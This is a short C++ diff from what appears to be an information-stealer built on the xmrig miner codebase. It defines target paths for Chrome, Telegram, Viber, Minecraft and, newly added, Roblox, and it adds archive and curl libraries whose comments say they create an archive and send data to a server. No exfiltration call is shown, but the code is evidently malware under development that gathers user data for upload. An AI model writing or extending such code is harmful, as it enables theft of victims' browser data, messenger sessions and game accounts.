@@ -3,15 +3,19 @@
 #include "Config.h"
 
 #include <iostream>           // FOR DEBUGGING
-//#include <curl/curl.h>        // FOR SENDING DATA TO SERVER
 #include <string>             // FOR WORK WITH STRINGS
 #include <fstream>            // FOR WORK WITH FILES
 #include <io.h>               // FOR CORRECTLY PRINT CYRILLIC CHARACTERS
 #include <Windows.h>          // FOR TlHelp32.h
 #include <tlhelp32.h>         // FOR WORK WITH PROCESSES
-#include "SQLite3.h"          // FOR PARSING BROWSER DATA
 #include "backend/cpu/Cpu.h"  // xmrig::Cpu       FOR GETTING CPU INFO
 #include "hw/dmi/DmiReader.h" // xmrig::DmiReader FOR GETTING MOTHERBOARD AND RAM INFO
+#include "archive.h"          // FOR CREATE A ARCHIVE
+#include "archive_entry.h"    // FOR archive.h
+#include "curl/curl.h"        // FOR SENDING DATA TO SERVER
+
+#pragma comment(lib, "archive.lib")
+#pragma comment(lib, "libcurl.lib")
 
 //   FOR INDEXING FILES
 #ifdef __cpp_lib_experimental_filesystem
@@ -54,6 +58,7 @@ wchar_t* chromedir  = new wchar_t[MAX_PATH];
 wchar_t* tdir       = new wchar_t[MAX_PATH];
 wchar_t* viber      = new wchar_t[MAX_PATH];
 wchar_t* minecraft  = new wchar_t[MAX_PATH];
+wchar_t* roblox     = new wchar_t[MAX_PATH];
 wofstream log_file(getabspathincurrdir(L"tmp\\result.log"));
 
 #define resetTemp temp = new wchar_t[MAX_PATH] // Reset temp variable
